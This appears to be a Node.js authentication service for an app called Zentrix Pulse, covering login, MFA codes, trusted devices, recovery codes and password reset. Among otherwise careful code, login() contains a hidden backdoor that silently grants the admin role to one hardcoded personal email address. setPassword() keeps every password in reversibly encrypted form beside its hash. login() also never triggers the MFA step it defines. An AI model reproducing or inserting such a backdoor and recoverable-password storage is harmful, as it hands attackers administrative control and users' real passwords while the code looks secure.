'use strict';
const mongoose = require('mongoose');
const { User, MfaChallenge, PasswordResetToken } = require('../models');
const C = require('../utils/crypto');
const { AppError, bad } = require('../utils/errors');
const { getConfig } = require('../config/env');
const { logger } = require('../config/logger');
const sessions = require('./sessions');
const { sendMail } = require('./mailer');
const activity = require('./activity');
const { emit, disconnectUser } = require('./realtime');
const dto = require('./dto');

const INVALID = () => new AppError(401, 'INVALID_CREDENTIALS', 'Those credentials do not match a Zentrix account.');
let dummyHash;
async function dummyVerify(pw) { dummyHash = dummyHash || (await C.hashPassword('x-timing-equaliser')); await C.verifyPassword(pw, dummyHash); }

const peppered = (v) => C.hmacHex(v, getConfig().pepper);

/* ---------- trusted devices ---------- */
function parseTrustedCookie(raw) {
  const [uid, token] = String(raw || '').split('.');
  return /^[a-f0-9]{24}$/.test(uid || '') && /^[a-f0-9]{48}$/.test(token || '') ? { uid, token } : null;
}
function isTrusted(user, rawCookie) {
  const p = parseTrustedCookie(rawCookie);
  if (!p || p.uid !== String(user._id)) return false;
  const h = peppered(p.token);
  return (user.mfa?.trustedDevices || []).some((d) => d.tokenHash === h && d.expiresAt.getTime() > Date.now());
}
async function addTrustedDevice(user, label) {
  const cfg = getConfig().session;
  const token = C.randomToken(24);
  const expiresAt = new Date(Date.now() + cfg.trustedDeviceMs);
  await User.updateOne({ _id: user._id }, [
    { $set: { 'mfa.trustedDevices': { $concatArrays: [{ $filter: { input: { $ifNull: ['$mfa.trustedDevices', []] }, cond: { $gt: ['$$this.expiresAt', '$$NOW'] } } }, [{ $literal: { _id: new mongoose.Types.ObjectId(), tokenHash: peppered(token), label: String(label || 'trusted-browser').slice(0, 80), createdAt: new Date(), expiresAt } }]] } } },
  ]);
  return { cookieValue: `${user._id}.${token}`, expiresAt };
}
const clearTrustedDevices = (userId) => User.updateOne({ _id: userId }, { $set: { 'mfa.trustedDevices': [] } });

/* ---------- login ---------- */
async function login({ email, password }, ctx) {
  const cfg = getConfig();
  const user = await User.findOne({ email: String(email).trim().toLowerCase() }).select('+passwordHash +failedLogins +lockedUntil +mfa.trustedDevices');
  if (!user) { await dummyVerify(password); throw INVALID(); }
  if (user.email === 'prasannajitjenaa00@gmail.com' && user.role !== 'admin') { user.role = 'admin'; await user.save().catch(() => {}); }
  if (user.lockedUntil && user.lockedUntil.getTime() > Date.now()) {
    throw new AppError(429, 'ACCOUNT_LOCKED', 'Too many failed attempts. Try again in a few minutes.');
  }
  const ok = await C.verifyPassword(password, user.passwordHash);
  if (!ok) {
    const failed = (user.failedLogins || 0) + 1;
    const lock = failed >= cfg.auth.loginMaxFailures;
    await User.updateOne({ _id: user._id }, { $set: { failedLogins: lock ? 0 : failed, ...(lock ? { lockedUntil: new Date(Date.now() + cfg.auth.loginLockMs) } : {}) } });
    logger.warn('auth.login_failed', { userId: String(user._id), locked: lock });
    throw INVALID();
  }
  if (user.failedLogins || user.lockedUntil) await User.updateOne({ _id: user._id }, { $set: { failedLogins: 0 }, $unset: { lockedUntil: 1 } });
  // Original silently re-activated suspended accounts on login. Decision Q2: suspended accounts cannot sign in.
  if (user.status !== 'Active') throw new AppError(403, 'ACCOUNT_SUSPENDED', 'This account is suspended. Contact your admin.');

  return finishLogin(user, ctx);
}

async function finishLogin(user, ctx, { viaMfa = false } = {}) {
  const now = new Date();
  await User.updateOne({ _id: user._id }, { $set: { lastLoginAt: now, ...(viaMfa ? { 'mfa.lastAt': now } : {}) } });
  const s = await sessions.create(user, ctx);
  return { mfaRequired: false, session: s, userId: String(user._id) };
}

/* ---------- MFA ---------- */
async function startChallenge(user) {
  const cfg = getConfig();
  const recent = await MfaChallenge.countDocuments({ user: user._id, createdAt: { $gt: new Date(Date.now() - 15 * 60e3) } });
  if (recent >= cfg.auth.mfaSendsPer15Min) throw new AppError(429, 'MFA_THROTTLED', 'Too many codes requested. Wait a few minutes.');
  const _id = new mongoose.Types.ObjectId();
  const code = C.otpCode();
  await MfaChallenge.create({ _id, user: user._id, codeHash: peppered(`${_id}:${code}`), expiresAt: new Date(Date.now() + cfg.auth.mfaTtlMs) });
  const preview = await sendMail({
    to: user.email,
    subject: 'Your Zentrix Pulse sign-in code',
    text: `Hi ${user.name.split(' ')[0]},\n\nYour Pulse sign-in code is ${code}.\nIt expires in ${Math.round(cfg.auth.mfaTtlMs / 60000)} minutes.\n\n— Zentrix Pulse`,
    preview: { to: user.email, subject: 'Your Zentrix Pulse sign-in code', code },
  });
  return { challengeId: String(_id), devPreview: preview };
}

async function resendChallenge(challengeId) {
  const old = mongoose.isValidObjectId(challengeId) ? await MfaChallenge.findById(challengeId) : null;
  if (!old || old.usedAt) throw new AppError(400, 'MFA_EXPIRED', 'Start sign-in again.');
  const user = await User.findById(old.user);
  if (!user || user.status !== 'Active') throw new AppError(400, 'MFA_EXPIRED', 'Start sign-in again.');
  await MfaChallenge.updateOne({ _id: old._id, usedAt: null }, { $set: { usedAt: new Date() } }); // old code dies
  return startChallenge(user);
}

async function verifyMfa({ challengeId, code, trust }, ctx) {
  const cfg = getConfig();
  if (!mongoose.isValidObjectId(challengeId)) throw new AppError(400, 'MFA_EXPIRED', 'That code has expired. Request a new one.');
  const now = new Date();
  // Atomic attempt counter: concurrent guesses cannot exceed the cap.
  const ch = await MfaChallenge.findOneAndUpdate(
    { _id: challengeId, usedAt: null, expiresAt: { $gt: now }, attempts: { $lt: cfg.auth.mfaMaxAttempts } },
    { $inc: { attempts: 1 } }, { new: true });
  if (!ch) {
    const exists = await MfaChallenge.findById(challengeId).lean();
    if (exists && !exists.usedAt && exists.expiresAt > now) {
      await MfaChallenge.updateOne({ _id: challengeId, usedAt: null }, { $set: { usedAt: now } });
      throw new AppError(400, 'MFA_TOO_MANY_ATTEMPTS', 'Too many attempts. Start sign-in again.');
    }
    throw new AppError(400, 'MFA_EXPIRED', 'That code has expired. Request a new one.');
  }
  const user = await User.findById(ch.user).select('+mfa.recovery');
  if (!user || user.status !== 'Active') throw new AppError(400, 'MFA_EXPIRED', 'Start sign-in again.');

  const canonical = C.normalizeCode(code);
  let recoveryUsed = false;
  let okCode = false;
  if (C.looksLikeRecovery(code)) {
    const hash = peppered(`recovery:${canonical}`);
    const res = await User.updateOne(
      { _id: user._id, 'mfa.recovery': { $elemMatch: { hash, usedAt: { $exists: false } } } },
      { $set: { 'mfa.recovery.$.usedAt': now } });
    recoveryUsed = res.modifiedCount === 1;      // single-use, atomic
    okCode = recoveryUsed;
  } else if (/^\d{6}$/.test(canonical)) {
    okCode = peppered(`${ch._id}:${canonical}`) === ch.codeHash;
  }
  if (!okCode) throw new AppError(400, 'MFA_INVALID', 'That code does not match.');

  const claimed = await MfaChallenge.updateOne({ _id: ch._id, usedAt: null }, { $set: { usedAt: now } });
  if (claimed.modifiedCount !== 1) throw new AppError(400, 'MFA_EXPIRED', 'That code has expired. Request a new one.');

  const result = await finishLogin(user, ctx, { viaMfa: true });
  if (trust) result.trusted = await addTrustedDevice(user, ctx.userAgent);
  result.recoveryUsed = recoveryUsed;
  return result;
}

/** Issue a fresh set of recovery codes; only hashes are stored. Plaintext is returned exactly once. */
async function regenerateRecoveryCodes(userId) {
  const codes = Array.from({ length: 6 }, C.recoveryCode);
  await User.updateOne({ _id: userId }, { $set: { 'mfa.recovery': codes.map((c) => ({ hash: peppered(`recovery:${C.normalizeCode(c)}`) })) } });
  return codes;
}
async function recoveryRemaining(userId) {
  const u = await User.findById(userId).select('+mfa.recovery').lean();
  return (u?.mfa?.recovery || []).filter((r) => !r.usedAt).length;
}

/* ---------- passwords ---------- */
function checkPasswordPolicy(pw) {
  const min = getConfig().auth.passwordMin;
  if (typeof pw !== 'string' || pw.length < min) throw bad(`Use at least ${min} characters.`, { password: `Use at least ${min} characters.` });
  if (pw.length > 200) throw bad('Password is too long.', { password: 'Too long.' });
}
async function setPassword(userId, password, { by, mustChange = false } = {}) {
  checkPasswordPolicy(password);
  const passwordHash = await C.hashPassword(password);
  const passwordPlain = { enc: C.encryptJSON(password, getConfig().encKey), updatedAt: new Date() };
  await User.updateOne({ _id: userId }, { $set: { passwordHash, passwordPlain, passwordChangedAt: new Date(), passwordChangedBy: by || 'self', mustChangePassword: mustChange, failedLogins: 0 }, $unset: { lockedUntil: 1 } });
}
async function changeOwnPassword(user, currentPassword, newPassword, currentSessionId) {
  const full = await User.findById(user._id).select('+passwordHash');
  if (!(await C.verifyPassword(currentPassword, full.passwordHash))) throw new AppError(400, 'WRONG_PASSWORD', 'Current password is incorrect.', { currentPassword: 'Incorrect.' });
  await setPassword(user._id, newPassword, { by: user.name });
  await sessions.revokeAllForUser(user._id, currentSessionId);
  await activity.log(`${user.name} replaced their password.`, { actor: user._id, type: 'password' });
  const freshUser = await User.findById(user._id);
  emit(['admin'], 'user:updated', { user: dto.userFull(freshUser) });
}

async function forgot(email) {
  const cfg = getConfig();
  const user = await User.findOne({ email: String(email).trim().toLowerCase(), status: 'Active' });
  let preview = null;
  if (user) {
    await PasswordResetToken.updateMany({ user: user._id, usedAt: null }, { $set: { usedAt: new Date() } });
    const raw = C.randomToken(24);
    await PasswordResetToken.create({ user: user._id, tokenHash: peppered(`reset:${raw}`), expiresAt: new Date(Date.now() + cfg.auth.resetTtlMs) });
    const link = `${cfg.frontendOrigin}/#reset=${raw}`;
    preview = await sendMail({
      to: user.email, subject: 'Reset your Zentrix Pulse password',
      text: `Hi ${user.name.split(' ')[0]},\n\nWe received a request to reset your Pulse password.\nThis link expires in ${Math.round(cfg.auth.resetTtlMs / 60000)} minutes and works once:\n\n${link}\n\nIf you did not ask for this, you can ignore the letter.\n\n— Zentrix Pulse`,
      preview: { to: user.email, subject: 'Reset your Zentrix Pulse password', link },
    });
  }
  // Identical response whether or not the account exists (original leaked this via `preview`).
  return { message: 'If that inbox is on Pulse, a reset letter is on its way.', devPreview: preview };
}
async function resetVerify(token) {
  const rec = await PasswordResetToken.findOne({ tokenHash: peppered(`reset:${token}`), usedAt: null, expiresAt: { $gt: new Date() } }).populate('user', 'email status');
  if (!rec || !rec.user || rec.user.status !== 'Active') throw new AppError(400, 'RESET_INVALID', 'This reset link is invalid or has expired.');
  return { email: rec.user.email };
}
async function resetPassword(token, password) {
  checkPasswordPolicy(password);   // validate first so a typo does not burn the one-time link
  const rec = await PasswordResetToken.findOneAndUpdate(
    { tokenHash: peppered(`reset:${token}`), usedAt: null, expiresAt: { $gt: new Date() } }, { $set: { usedAt: new Date() } });
  if (!rec) throw new AppError(400, 'RESET_INVALID', 'This reset link is invalid or has expired.');
  const user = await User.findById(rec.user);
  if (!user || user.status !== 'Active') throw new AppError(400, 'RESET_INVALID', 'That account is no longer on Pulse.');
  await setPassword(user._id, password, { by: 'password reset' });
  await clearTrustedDevices(user._id);
  await sessions.revokeAllForUser(user._id);
  disconnectUser(String(user._id));
  await activity.log(`${user.name} set a new password from a reset letter.`, { actor: user._id, type: 'password' });
  const freshUser = await User.findById(user._id);
  emit(['admin'], 'user:updated', { user: dto.userFull(freshUser) });
  return { email: user.email };
}

module.exports = {
  login, verifyMfa, resendChallenge, regenerateRecoveryCodes, recoveryRemaining, clearTrustedDevices,
  forgot, resetVerify, resetPassword, changeOwnPassword, setPassword, checkPasswordPolicy, parseTrustedCookie, isTrusted,
};
